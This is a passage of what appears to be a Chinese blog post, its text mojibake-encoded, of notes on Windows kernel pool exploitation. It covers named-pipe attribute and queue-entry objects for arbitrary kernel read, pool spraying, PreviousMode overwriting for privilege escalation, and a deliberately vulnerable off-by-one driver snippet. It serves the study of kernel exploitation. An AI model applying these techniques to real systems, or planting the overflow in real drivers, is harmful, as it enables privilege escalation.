<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeAttribute</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    <span class="type">char</span> *AttributeName;</span><br><span class="line">    <span class="type">uint64_t</span> AttributeValueSize;</span><br><span class="line">    <span class="type">char</span> *AttributeValue;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>åˆ†é…çš„å¤§å°å’Œæ•°æ®å®Œå…¨ç”±æ”»å‡»è€…æ§åˆ¶ã€‚<code>AttributeName</code>å’Œ<code>AttributeValue</code>æ˜¯æŒ‡å‘æ•°æ®å­—æ®µçš„ä¸åŒåç§»çš„æŒ‡é’ˆã€‚ å¯ä»¥ä½¿ç”¨<code>NtFsControlFile</code>ç³»ç»Ÿè°ƒç”¨å’Œ<code>0x11003C</code>æ§åˆ¶ç åœ¨ç®¡é“ä¸Šåˆ›å»ºç®¡é“å±æ€§ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HANDLE read_pipe;</span><br><span class="line">HANDLE write_pipe;</span><br><span class="line"><span class="type">char</span> attribute[] = <span class="string">&quot; attribute_name \00 attribute_value &quot;</span>;</span><br><span class="line"><span class="type">char</span> output[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">CreatePipe</span>(read_pipe, write_pipe, <span class="literal">NULL</span>, bufsize);</span><br><span class="line"><span class="built_in">NtFsControlFile</span>(write_pipe,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                &amp;status,</span><br><span class="line">                <span class="number">0x11003C</span>,</span><br><span class="line">                attribute,</span><br><span class="line">                <span class="built_in">sizeof</span>(attribute),</span><br><span class="line">                output,</span><br><span class="line">                <span class="built_in">sizeof</span>(output));</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¯ä»¥ä½¿ç”¨<code>0x110038</code>æ§åˆ¶ç è¯»å–å±æ€§çš„å€¼ã€‚<code>AttributeValue</code>æŒ‡é’ˆå’Œ<code>AttributeValueSize</code>å°†ç”¨äºè¯»å–å±æ€§çš„å€¼å¹¶å°†å…¶è¿”å›ç»™ç”¨æˆ·ã€‚å±æ€§çš„å€¼å¯ä»¥æ›´æ”¹ï¼Œä½†è¿™å°†è§¦å‘å…ˆå‰<code>PipeAttribute</code>çš„é‡Šæ”¾å’Œæ–°åˆ†é…ã€‚</p>
<p>è¿™æ„å‘³ç€å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ§åˆ¶<code>PipeAttribute</code>çš„<code>AttributeValue</code>å’Œ<code>AttributeValueSize</code>å­—æ®µï¼Œå®ƒå¯ä»¥åœ¨å†…æ ¸ä¸­è¯»å–ä»»æ„æ•°æ®ï¼Œä½†ä¸èƒ½ä»»æ„å†™å…¥ã€‚è¯¥å¯¹è±¡è¿˜å¯ä»¥ç”¨äºåœ¨å†…æ ¸ä¸­æ”¾ç½®ä»»æ„æ•°æ®ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥ç”¨äºé‡æ–°åˆ†é…æ˜“å—æ”»å‡»å—å¹¶æ§åˆ¶å¹½çµå—çš„å†…å®¹ã€‚</p>
<h5 id="NpFr"><a href="#NpFr" class="headerlink" title="NpFr"></a>NpFr</h5><p>WriteFileå†™NamedPipeä¼šè·å¾—chunkï¼Œä¹Ÿæ˜¯å¯ä»¥é€ æˆä»»æ„è¯»ï¼Œåªè¦èƒ½æ§åˆ¶<code>Irp</code>å’Œ<code>isDataInKernel</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">PipeQueueEntry</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY list;</span><br><span class="line">    IRP *linkedIRP;</span><br><span class="line">    __int64 SecurityClientContext;</span><br><span class="line">    <span class="type">int</span> isDataInKernel;</span><br><span class="line">    <span class="type">int</span> remaining_bytes__;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> field_2C;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»pipe</span></span><br><span class="line"><span class="keyword">if</span> (PipeQueueEntry-&gt;isDataAllocated == <span class="number">1</span>)</span><br><span class="line">    data_ptr = (PipeQueueEntry-&gt;linkedIRP-&gt;SystemBuffer);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    data_ptr = PipeQueueEntry-&gt;data;</span><br><span class="line">[...] </span><br><span class="line"><span class="built_in">memmove</span>((<span class="type">void</span> *)(dst_buf + dst_len - cur_read_offset), &amp;data_ptr[PipeQueueEntry-&gt;DataSize - cur_entry_offset], copy_size);</span><br></pre></td></tr></table></figure>

<h4 id="spray"><a href="#spray" class="headerlink" title="spray"></a>spray</h4><p>ä¸ºäº†è·å¾—ç¬¬æ‰€éœ€çš„å†…å­˜å¸ƒå±€ï¼Œéœ€è¦è¿›è¡Œä¸€äº›sprayã€‚sprayå–å†³äºæ˜“å—æ”»å‡»çš„å—çš„å¤§å°ï¼Œå› ä¸ºå®ƒå°†æœ€ç»ˆåˆ†é…åˆ°ä¸åŒçš„åˆ†é…åç«¯ã€‚</p>
<p>ä¸ºäº†ç®€åŒ–sprayè¿‡ç¨‹ï¼Œå¯ä»¥ç¡®ä¿ç›¸åº”çš„<code>lookaside</code>ä¸ºç©ºã€‚åˆ†é…è¶…è¿‡256ä¸ªç›¸åŒå¤§å°çš„å—å°†ç¡®ä¿è¿™ä¸€ç‚¹ã€‚</p>
<p>å¦‚æœæ˜“å—æ”»å‡»çš„å—å°äº0x200ï¼Œåˆ™å®ƒå°†ä½äºLFHï¼ˆä½ç¢ç‰‡åŒ–å †ï¼‰åç«¯ã€‚ç„¶åï¼Œsprayåº”è¯¥ä½¿ç”¨å®Œå…¨ç›¸åŒå¤§å°çš„å—è¿›è¡Œï¼Œå¯¹åº”æ¡¶çš„ç²’åº¦å–æ¨¡ï¼Œä»¥ç¡®ä¿å®ƒä»¬éƒ½ä»åŒä¸€ä¸ªæ¡¶ä¸­åˆ†é…ã€‚å½“è¯·æ±‚åˆ†é…æ—¶ï¼ŒLFHåç«¯å°†æŒ‰ç…§æœ€å¤š32ä¸ªå—çš„ç»„è¿›è¡Œæ‰«æ<code>BlockBitmap</code>ï¼Œå¹¶éšæœºé€‰æ‹©ä¸€ä¸ªç©ºé—²å—ã€‚åœ¨æ˜“å—æ”»å‡»çš„å—åˆ†é…ä¹‹å‰å’Œä¹‹ååˆ†é…è¶…è¿‡32ä¸ªå—åº”æœ‰åŠ©äºæ‰“è´¥éšæœºåŒ–ã€‚</p>
<p>å¦‚æœæ˜“å—æ”»å‡»çš„å—å¤§äº<code>0x200</code>ä½†å°äº<code>0x10000</code>ï¼Œåˆ™å®ƒå°†ä½äºå¯å˜å¤§å°ï¼ˆVariable Sizeï¼‰åç«¯ã€‚ç„¶åï¼Œsprayåº”è¯¥ä½¿ç”¨ä¸æ˜“å—æ”»å‡»çš„å—å¤§å°ç›¸ç­‰çš„å¤§å°è¿›è¡Œã€‚è¾ƒå¤§çš„å—å¯èƒ½ä¼šè¢«æ‹†åˆ†ï¼Œä»è€Œå¯¼è‡´å–·æ´’å¤±è´¥ã€‚é¦–å…ˆï¼Œåˆ†é…æ•°åƒä¸ªæ‰€é€‰å¤§å°çš„å—ï¼Œä»¥ç¡®ä¿é¦–å…ˆå°†<code>FreeChunkTree</code>ä¸­å¤§äºæ‰€é€‰å¤§å°çš„æ‰€æœ‰å—æ¸…ç©ºï¼Œç„¶ååˆ†é…å™¨å°†åˆ†é…ä¸€ä¸ªæ–°çš„<code>0x10000</code>å­—èŠ‚çš„VSå­æ®µå¹¶å°†å…¶æ”¾å…¥<code>FreeChunkTree</code>ä¸­ã€‚ç„¶ååˆ†é…å¦å¤–æ•°åƒä¸ªå—ï¼Œå®ƒä»¬å°†æœ€ç»ˆä½äºæ–°çš„å¤§ç©ºé—²å—ä¸­ï¼Œä»è€Œè¿ç»­ã€‚ç„¶åé‡Šæ”¾æœ€ååˆ†é…å—çš„ä¸‰åˆ†ä¹‹ä¸€ï¼Œä»¥å¡«å……<code>FreeChunkTree</code>ã€‚åªé‡Šæ”¾ä¸‰åˆ†ä¹‹ä¸€å°†ç¡®ä¿ä¸ä¼šåˆå¹¶ä»»ä½•å—ã€‚ç„¶åè®©æ˜“å—æ”»å‡»çš„å—åˆ†é…ã€‚</p>
<p>æœ€åï¼Œå¯ä»¥é‡æ–°åˆ†é…å·²é‡Šæ”¾çš„å—ä»¥æœ€å¤§åŒ–å–·æ´’æœºä¼šã€‚</p>
<p>ç”±äºå®Œæ•´çš„åˆ©ç”¨æŠ€æœ¯éœ€è¦é‡Šæ”¾å’Œé‡æ–°åˆ†é…æ˜“å—æ”»å‡»çš„å—å’Œå¹½çµå—ï¼Œä¸ºäº†æ–¹ä¾¿é‡Šæ”¾å—çš„æ¢å¤ï¼Œå¯ç”¨ç›¸åº”çš„åŠ¨æ€<code>lookaside</code>éå¸¸æœ‰è¶£ã€‚ä¸ºæ­¤ï¼Œä¸€ä¸ªç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯åˆ†é…æ•°åƒä¸ªç›¸åº”å¤§å°çš„å—ï¼Œç­‰å¾…2ç§’é’Ÿï¼Œç„¶åå†åˆ†é…æ•°åƒä¸ªå—å¹¶ç­‰å¾…1ç§’é’Ÿã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿å¹³è¡¡é›†ç®¡ç†å™¨å·²ç»é‡æ–°å¹³è¡¡äº†ç›¸åº”çš„<code>lookaside</code>ã€‚åˆ†é…æ•°åƒä¸ªå—ç¡®ä¿<code>lookaside</code>å°†æˆä¸ºæœ€å¸¸ç”¨çš„<code>lookaside</code>ï¼Œå¹¶ä¸”å°†è¢«å¯ç”¨ï¼Œå¹¶ä¸”è¿˜ç¡®ä¿å®ƒåœ¨å…¶ä¸­æœ‰è¶³å¤Ÿçš„ç©ºé—´ã€‚</p>
<h4 id="IO-Ring"><a href="#IO-Ring" class="headerlink" title="IO Ring"></a>IO Ring</h4><p>win11ä¸é”™çš„æ¼æ´åˆ©ç”¨å¯¹è±¡ã€‚</p>
<p>å¤ç°äº†ç›¸å…³CVEï¼š<a href="https://github.com/Ha0-Y/CVE-2023-21768">CVE-2023-21768 Proof of Concept</a></p>
<h4 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h4><p>ä¿®æ”¹<code>_KTHREAD.PreviousMode</code>å­—æ®µã€‚</p>
<p>ç”¨æˆ·æ€ç¨‹åºè°ƒç”¨ç³»ç»Ÿçš„ Nt æˆ– Zw æ—¶ï¼Œç³»ç»Ÿè°ƒç”¨æœºåˆ¶ä¼šå°†è°ƒç”¨çº¿ç¨‹æ•è·åˆ°å†…æ ¸æ¨¡å¼ã€‚ ä¸ºäº†æ ‡è¯†å‚æ•°æºè‡ªç”¨æˆ·æ¨¡å¼ï¼Œç³»ç»Ÿè°ƒç”¨çš„å¤„ç†ç¨‹åºå°†è°ƒç”¨æ–¹çº¿ç¨‹å¯¹è±¡ä¸­çš„ PreviousMode å­—æ®µè®¾ç½®ä¸º UserModeã€‚  </p>
<p>è€Œå†…æ ¸æ€ç¨‹åºè°ƒç”¨ç³»ç»Ÿä¾‹ç¨‹å¹¶å°†å‚æ•°å€¼ä¼ é€’ç»™æ¥è‡ªå†…æ ¸æ€çš„ä¾‹ç¨‹ï¼Œå½“å‰çº¿ç¨‹å¯¹è±¡ä¸­çš„ PreviousMode å­—æ®µåº”ä¸º KernelModeã€‚ </p>
<p>ç³»ç»Ÿä¼šæ£€æŸ¥è°ƒç”¨çº¿ç¨‹çš„ PreviousMode å­—æ®µã€‚è¿™æ ·é€šè¿‡å‚æ•°å°±å¯ä»¥çŸ¥é“æ˜¯æ¥è‡ªç”¨æˆ·æ€è¿˜æ˜¯å†…æ ¸æ€äº†ã€‚</p>
<p>æ‰€ä»¥å½“ PreviousMode è®¾ç½®ä¸º 1 æ—¶ï¼Œæ¥è‡ªç”¨æˆ·ç©ºé—´çš„NT æˆ– Zw ç‰ˆæœ¬å‡½æ•°è°ƒç”¨å°†å…¶ä¸­è¿›è¡Œåœ°å€éªŒè¯ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯¹å†…æ ¸å†…å­˜çš„ä»»æ„å†™å°†å¤±è´¥ï¼Œå› ä¸ºæ­¤æ—¶PreviousModeæ˜¯ç”¨æˆ·æ€çš„çŠ¶æ€ã€‚å½“ PreviousMode è®¾ç½®ä¸º 0 (æ­¤æ—¶æ˜¯å†…æ ¸æ€) æ—¶ï¼Œå°†è·³è¿‡åœ°å€éªŒè¯å†™å…¥ä»»æ„å†…æ ¸å†…å­˜åœ°å€ï¼Œä»è€Œå®Œæˆææƒã€‚</p>
<p>å½“æˆ‘ä»¬æ›¿æ¢<code>PreviousMode</code>ä¸º<code>0</code>åï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>NtWriteVirtualMemory</code>åœ¨æ•´ä¸ªå†…æ ¸å†…å­˜ä¸­è¿›è¡Œä¸å—çº¦æŸçš„RWã€‚</p>
<ul>
<li><code>NtReadVirtualMemory</code> å’Œ <code>NtWriteVirtualMemory</code> è°ƒç”¨å‡½æ•°ç›¸åŒï¼ˆ<code>MiReadWriteVirtualMemory</code>ï¼‰ï¼Œå› æ­¤åœ¨ä¸€å®šæ–¹é¢ NtWriteVirtualMemory ä¹Ÿå¯ä»¥ä»»æ„è¯»</li>
</ul>
<h4 id="New"><a href="#New" class="headerlink" title="New"></a>New</h4><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/kernel/updating-deprecated-exallocatepool-calls">ExAllocatePool2 å’Œ ExAllocatePool3 </a>ï¼Œåœ¨ä½ç‰ˆæœ¬çš„Windowsç³»ç»Ÿä¸­ä¼šå¯¼è‡´æ— æ³•åŠ è½½é©±åŠ¨ğŸ¤£</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">DECLSPEC_RESTRICT PVOID <span class="title">ExAllocatePool2</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  POOL_FLAGS Flags,</span></span></span><br><span class="line"><span class="params"><span class="function">  SIZE_T     NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  ULONG      Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Old code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br><span class="line"><span class="built_in">RtlZeroMemory</span>(Allocation, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// New code</span></span><br><span class="line">PVOID Allocation = <span class="built_in">ExAllocatePool2</span>(POOL_FLAG_PAGED, <span class="number">100</span>, <span class="string">&#x27;abcd&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="NPFS-SYS"><a href="#NPFS-SYS" class="headerlink" title="NPFS.SYS"></a>NPFS.SYS</h3><p>named pipe file systemï¼Œå¸¸è§çš„ç»“æ„ä½“</p>
<p>è¿™ä¸€ç¯‡æ–‡ç« ï¼š<a href="https://bbs.kanxue.com/thread-278483.htm#msg_header_h2_4">æ–°å‹Windowså†…æ ¸æ± é£æ°´åˆ©ç”¨å·¥å…·ç ”ç©¶</a></p>
<ul>
<li>å‘½åç®¡é“çš„åç«¯å®ç°åœ¨ä¸€ä¸ªåä¸ºNPFS.SYSé©±åŠ¨ä¸­ï¼Œæ¨¡å—çš„ä¸»è¦å®ç°å’Œå…¬å¼€çš„<a href="https://doxygen.reactos.org/dir_552a77878df93326bbe516beefdc08b2.html">npfsæ¨¡å—reactosæºç </a>åŸºæœ¬ä¸Šå¤§è‡´ç›¸åŒã€‚</li>
</ul>
<h4 id="DATA-QUEUE-ENTRY"><a href="#DATA-QUEUE-ENTRY" class="headerlink" title="DATA_QUEUE_ENTRY"></a>DATA_QUEUE_ENTRY</h4><p>Queue: åŒå‘é“¾è¡¨</p>
<p>SecurityContext</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">nt!_SECURITY_CLIENT_CONTEXT</span><br><span class="line">   +<span class="number">0x000</span> SecurityQos      : _SECURITY_QUALITY_OF_SERVICE</span><br><span class="line">   +<span class="number">0x010</span> ClientToken      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x018</span> DirectlyAccessClientToken : UChar</span><br><span class="line">   +<span class="number">0x019</span> DirectAccessEffectiveOnly : UChar</span><br><span class="line">   +<span class="number">0x01a</span> ServerIsRemote   : UChar</span><br><span class="line">   +<span class="number">0x01c</span> ClientTokenControl : _TOKEN_CONTROL</span><br></pre></td></tr></table></figure>

<p>EntryType</p>
<ul>
<li>Buffered Entriesï¼šè¿™ä¸ªå€¼ä¸º0ï¼Œå½“è°ƒç”¨ReadFileæ—¶ä»<code>DATA_QUEUE_ENTRY.data</code>è¯»å–æ•°æ®</li>
<li>Unbuffered Entries: å€¼ä¸º1ï¼Œå½“è°ƒç”¨ReadFileæ—¶ä»<code>DATA_QUEUE_ENTRY.Irp-&gt;AssociatedIrp.SystemBuffer</code>è¯»å–æ•°æ®</li>
</ul>
<p><strong>QuotaInEntry</strong>: è¢«æ¶ˆè€—</p>
<ul>
<li>buffered entries,ï¼šå¼€å§‹æ˜¯DataSizeï¼Œæ¯å½“è¯»å–ä¸€æ¬¡ï¼Œå°±ä¼šè¾ƒå°‘ï¼Œç›´åˆ°0</li>
<li>unbuffered entriesï¼š0</li>
</ul>
<p><strong>DataSize</strong>: user dataçš„é•¿åº¦</p>
<p>x: padding</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;   </span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    _SECURITY_CLIENT_CONTEXT* SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;</span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_NP_DATA_QUEUE</span></span><br><span class="line">&#123;</span><br><span class="line">    LIST_ENTRY Queue;</span><br><span class="line">    ULONG QueueState;</span><br><span class="line">    ULONG BytesInQueue;</span><br><span class="line">    ULONG EntriesInQueue;</span><br><span class="line">    ULONG QuotaUsed;</span><br><span class="line">    ULONG ByteOffset;</span><br><span class="line">    ULONG Quota;</span><br><span class="line">&#125; NP_DATA_QUEUE, *PNP_DATA_QUEUE;</span><br><span class="line"></span><br><span class="line"><span class="comment">//nSizeæŒ‡å®šäº†pipeçš„æœ€å¤§å®¹é‡</span></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hReadPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PHANDLE               hWritePipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] LPSECURITY_ATTRIBUTES lpPipeAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DWORD                 nSize</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡<code>CreatePipe</code>åˆ›å»ºå‘½åç®¡é“æ–‡ä»¶å¯¹è±¡ï¼Œæ–‡ä»¶å®ä¾‹ç»‘å®šäº†ä¸€ä¸ªåä¸ºNP_DATA_QUEUEç±»å‹çš„é˜Ÿåˆ—å¯¹è±¡</p>
<p>CreatePipeçš„å‚æ•°nSizeæŒ‡å®šäº†å½“å‰pipeçš„æœ€å¤§å®¹é‡æˆ–è€…è¯´æ˜¯å…è®¸æœ€å¤§ç¼“å†²åŒºé•¿åº¦,æ¯å¯¹pipeè¿›è¡Œä¸€æ¬¡è¯»å†™æ“ä½œå°±ä¼šå¢åŠ ä¸€ä¸ªDATA_QUEUE_ENTRYã€‚</p>
<p>è‹¥å¹²æ¬¡å†™å¯ä»¥å¯¹åº”è‹¥å¹²æ¬¡è¯»,å½“å­˜åœ¨è¯»æ•°æ®çš„è¯·æ±‚æ—¶irpå°±ä¼šæŒ‚èµ·,ç›´åˆ°å†™å…¥è¯·æ±‚çš„æ•°æ®é‡è¾¾åˆ°è¯»å–è¯·æ±‚çš„æ•°æ®é‡æ‰ä¼šå®Œæˆæ•´ä¸ªè¯»å–irpè¯·æ±‚,æ¯”å¦‚è¯´pipeçš„å®¹é‡æ˜¯1000,ç¬¬ä¸€æ¬¡å†™äº†1000çš„æ•°æ®,è¿™ä¸ªå†™è¯·æ±‚ä¼šè¿”å›,ç¬¬äºŒæ¬¡åˆå†™äº†1000æ•°æ®é‚£ä¹ˆè¿™ä¸ªè¯·æ±‚å°±ä¸€ç›´æŒ‚èµ·,ç›´åˆ°è¯»å–äº†1000æ•°æ®å,æœ€åå†™å…¥çš„æ•°æ®å°äºæˆ–ç­‰äºpipeçš„å®¹é‡,åé¢å†™è¯·æ±‚æ‰ä¼šè¿”å›.</p>
<h4 id="npfs-NpAddDataQueueEntry"><a href="#npfs-NpAddDataQueueEntry" class="headerlink" title="npfs!NpAddDataQueueEntry"></a>npfs!NpAddDataQueueEntry</h4><p>å¯ä»¥ä¸‹æ–­ç‚¹ğŸ˜‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_REQUIRED_START 0x0000000000000001UI64</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_USE_QUOTA 0x0000000000000001UI64 <span class="comment">// Charge quota</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POOL_FLAG_NON_PAGED 0x0000000000000040UI64 <span class="comment">// Non paged pool NX</span></span></span><br><span class="line"><span class="keyword">if</span> ( !a5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v14 = Size + <span class="number">0x30</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)Size + <span class="number">0x30</span> &lt; (<span class="type">unsigned</span> <span class="type">int</span>)Size )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xC000000D</span>i64;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v24 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v15 = Size - a9;</span><br><span class="line">    <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 )</span><br><span class="line">      v15 = *(_DWORD *)(a3 + <span class="number">28</span>) - *(_DWORD *)(a3 + <span class="number">32</span>);</span><br><span class="line">    v26 = v15;</span><br><span class="line">    <span class="keyword">if</span> ( v14 == <span class="number">0x30</span> &amp;&amp; _interlockedbittestandreset((<span class="keyword">volatile</span> <span class="type">signed</span> __int32 *)(a3 + <span class="number">40</span>), <span class="number">0</span>) )</span><br><span class="line">      v16 = *(_QWORD *)(a3 + <span class="number">40</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v16 = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v16 = <span class="built_in">ExAllocatePool2</span>(<span class="number">0x41</span>i64, v14, <span class="string">&#x27;rFpN&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v16 )</span><br><span class="line">    &#123;</span><br><span class="line">      v15 = v26;</span><br><span class="line">LABEL_14:</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">36</span>) = v15;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">16</span>) = v13;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">32</span>) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(v16 + <span class="number">24</span>) = v12;</span><br><span class="line">      *(_DWORD *)(v16 + <span class="number">40</span>) = Size;</span><br><span class="line">      <span class="keyword">if</span> ( a4 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v13 )</span><br><span class="line">          v22 = *(<span class="type">const</span> <span class="type">void</span> **)(v13 + <span class="number">112</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          v22 = a8;</span><br><span class="line">        <span class="built_in">memmove</span>((<span class="type">void</span> *)(v16 + <span class="number">48</span>), v22, (<span class="type">unsigned</span> <span class="type">int</span>)Size);</span><br><span class="line">        <span class="keyword">if</span> ( v24 &lt; (<span class="type">int</span>)Size - a9 &amp;&amp; v13 )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="number">259</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(_QWORD *)(v16 + <span class="number">16</span>) = <span class="number">0</span>i64;</span><br><span class="line">          v17 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v17 = <span class="number">259</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_16;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_51:</span><br><span class="line">    <span class="built_in">NpFreeClientSecurityContext</span>(v12);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h3 id="NonPagedPool-Overflow"><a href="#NonPagedPool-Overflow" class="headerlink" title="NonPagedPool Overflow"></a>NonPagedPool Overflow</h3><p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a></p>
<p>æœ‰æºç ä»¥åŠè¯¦ç»†çš„åˆ©ç”¨æ‰‹æ³•ã€‚</p>
<p>æº¢å‡ºè¦†ç›–ä¸€å­—èŠ‚ï¼Œä¹Ÿåˆ†åˆ«ç»™å‡ºä¸¤ç§åˆ©ç”¨æ‰‹æ®µçš„exp</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">Al20c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">All0c</span><span class="params">(<span class="type">size_t</span> Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span>* buf = (<span class="type">char</span>*)<span class="built_in">ExAllocatePoolWithTag</span>(NonPagedPoolNx, Size, <span class="string">&#x27;AAAA&#x27;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= Size &amp;&amp; buf; i++)</span><br><span class="line">		buf[i] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>å±•ç¤ºå¦‚ä½•åˆ›å»ºunbuffered pipe</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSYSCALLAPI NTSTATUS <span class="title">NtFsControlFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE           FileHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  HANDLE           Event,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            ApcContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]           PIO_STATUS_BLOCK IoStatusBlock,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            FsControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]  PVOID            InputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            InputBufferLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PVOID            OutputBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG            